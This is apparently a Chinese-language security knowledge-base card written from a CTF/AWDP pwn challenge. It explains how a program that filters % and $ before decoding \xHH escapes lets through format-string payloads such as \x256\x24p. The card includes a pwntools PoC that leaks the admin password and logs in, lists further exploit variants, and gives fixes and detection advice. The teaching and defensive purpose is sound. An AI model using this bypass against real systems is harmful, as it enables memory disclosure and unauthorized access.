---
id: binary-pwn-format-string-decode-after-filter-bypass
title: 格式化字符串黑名单绕过：先过滤后解码，\x25/\x24 还原 %/$ 触发泄漏
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-decode-after-filter-bypass
tags:
- pwn
- format-string
- filter-bypass
- decoding
- canonicalization
- ctf
- awdp
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:13:51+08:00'
  notes: 已对照原文与图01/02/04核对：set_notice 先 strchr 检查 %/$、再 str(\xHH 解码)、解码结果进 Notice 格式化输出；payload \x256\x24p+\x257\x24p 解码为 %6$p%7$p，图02 验证 \x24→$；Fix 补丁（图04）在解码后对 rbp-310h 再查 0x25/0x24，与卡片修复段一致。PoC 未本机复跑；原文未标注组件版本。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-decode-after-filter-bypass/
draft: false
kb_aliases:
- 先过滤后解码
- \xHH 解码绕过
- '%/$ 黑名单绕过'
- Robo_admin
- set_notice
- ASCII 转义还原
---

## 一句话结论

程序在原始输入上检查 `%` 和 `$`，但随后用 `\xHH` 解码器把转义序列还原成字节，再把解码结果当格式化字符串使用；发送 `\x256\x24p`（解码为 `%6$p`）即可绕过黑名单，泄漏栈上的管理员密码并进入 admin 功能。

## 原理

- **过滤点**：`set_notice()` 先 `choice(s, 0x200)` 读原始输入，然后 `if (strchr(s, 0x25) || strchr(s, 0x24))` 拒绝包含 `%`（0x25）或 `$`（0x24）的输入。
- **解码点**：过滤通过后调用 `str(s, src, 0x100)`。该函数逐字节扫描，遇到 `\` 且下一个字符是 `x` 时，用 `sub_14D5` 解析后两位十六进制，写入一个字节；否则原样复制。因此 `\x25` 变成 `%`，`\x24` 变成 `$`。
- **sink**：解码结果 `memcpy` 到全局 notice 缓冲区，`show status` 输出 `Notice: ` 后直接把它当格式串（或等价的可控 format 调用）。解码后的 `%6$p` / `%7$p` 会读取第 6/7 个可变参数位置并打印指针。
- **为什么成立**：校验发生在“编码表示”上，sink 发生在“解码表示”上；两者之间的任何规范化/解码都会重新引入被禁止的字符。这是典型的 canonicalization order 缺陷，不限于 `\xHH`。
- **本题利用**：`\x256\x24p\x257\x24p` 解码为 `%6$p%7$p`，输出两段 18 字符十六进制（含 `0x` 前缀），作为 32 位十六进制管理员密码；token 为 `ROBOADMIN`。登录后进入堆管理功能，继续 off-by-one/unlink 链。
- **修复**：把检查移到解码之后，对解码缓冲区再查 `%`/`$`；更彻底的是把 `printf(buf)` 改成 `printf("%s", buf)` 或 `puts(buf)`。

## 触发条件

- 原始输入存在 `%`/`$` 等黑名单，但之后还有一层解码（`\xHH`、URL、HTML entity、base64、Unicode escape 等）。
- 解码结果进入格式化字符串 sink（`printf`/`fprintf`/`syslog`/`snprintf` 的 format 参数）。
- 攻击者可以发送包含转义序列的输入，且解码器支持该语法。
- 黑名单字符在编码表示中不出现（如 `\x25` 不含 `%` 字节）。

## 利用步骤

1. 反编译入口函数，记录黑名单字符、解码函数和 sink 的调用顺序；确认解码发生在检查之后。
2. 用无害转义验证解码器：发送 `\x24`，若 `show status` 显示 `Notice: $`，说明 `\xHH` 被还原。
3. 构造 payload：`\x25` 代替 `%`、`\x24` 代替 `$`；例如 `\x256\x24p` → `%6$p`，`\x257\x24p` → `%7$p`。
4. 通过 set_notice 写入，再触发 show status；解析 `Notice: ` 后的十六进制泄漏值。
5. 用泄漏值作为管理员密码/token 登录；若泄漏的是栈地址/canary，继续计算偏移。
6. 若后续还有堆功能，按堆题链继续（见关联卡）。

## PoC

```python
from pwn import *

p = process("./robo_admin")
# 原始输入里没有 % 和 $，只有 \x25 / \x24 转义
payload = rb"\x256\x24p\x257\x24p"   # 服务端解码为 %6$p%7$p

p.sendlineafter(b"> ", b"1")          # set notice
p.sendline(payload)
p.sendlineafter(b"> ", b"2")          # show status
p.recvuntil(b"Notice: ")
leak1 = int(p.recv(18), 16)
leak2 = int(p.recv(18), 16)
print(hex(leak1), hex(leak2))

p.sendlineafter(b"> ", b"3")          # admin login
p.sendlineafter(b"Token:\n", b"ROBOADMIN")
p.sendlineafter(b"Password (32 hex):\n", f"{leak1:08x}{leak2:08x}".encode())
p.interactive()
```

修复示例（在解码之后检查）：

```c
if (decode(raw, decoded, sizeof(decoded)) != 0) { /* error */ }
if (strchr(decoded, '%') || strchr(decoded, '$')) {
    puts("[X] decoded input contains illegal char");
    return;
}
/* 更彻底：printf("%s", decoded); */
```

## 变体与关联

- **编码变体**：`\xHH`、`\uHHHH`、URL `%25`、HTML `&#37;`、Base64、双重编码；只要“检查在前、解码在后”就成立。
- **sink 变体**：`printf(buf)`、`fprintf(fp, buf)`、`syslog(pri, buf)`、`snprintf(dst, n, buf)` 等把用户数据当 format 的调用。
- **利用目标变体**：`%p` 泄漏栈/canary/libc；`%n` 任意写；`%s` 读任意地址。
- **关联卡片**：[[binary-pwn-format-string-got-hijack]]（`%n` 覆写 GOT）、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（泄漏后 ROP）、[[web-generic-file-inclusion-encoded-dotdot-predecode-blacklist-bypass]]（同类“先过滤后解码”缺陷）、[[ctf-pwn-awdp-format-string-patch]]（AWDP 二进制补丁）。
- **边界**：若解码器在检查之前、或 sink 使用固定格式串 `printf("%s", buf)`，则不能绕过；解码输出长度/截断也可能影响 payload 布局。

## 检测与防御

- **代码审计**：搜索黑名单检查（`strchr`/正则）与解码函数的相对顺序；确认所有解码完成后才做校验。
- **修复**：统一在“最终规范化表示”上校验；格式化输出一律使用固定格式串；开启 `-Wformat-security`/FORTIFY。
- **检测信号**：输入中出现 `\x` 转义但原始字节不含黑名单字符；`Notice:` 等输出出现 `0x...` 指针格式。
- **AWDP fix**：若只能改二进制，可在解码调用之后插入 `strchr(decoded,'%')`/`strchr(decoded,'$')` 检查并跳转到拒绝分支；注意保持栈平衡与寄存器约定。
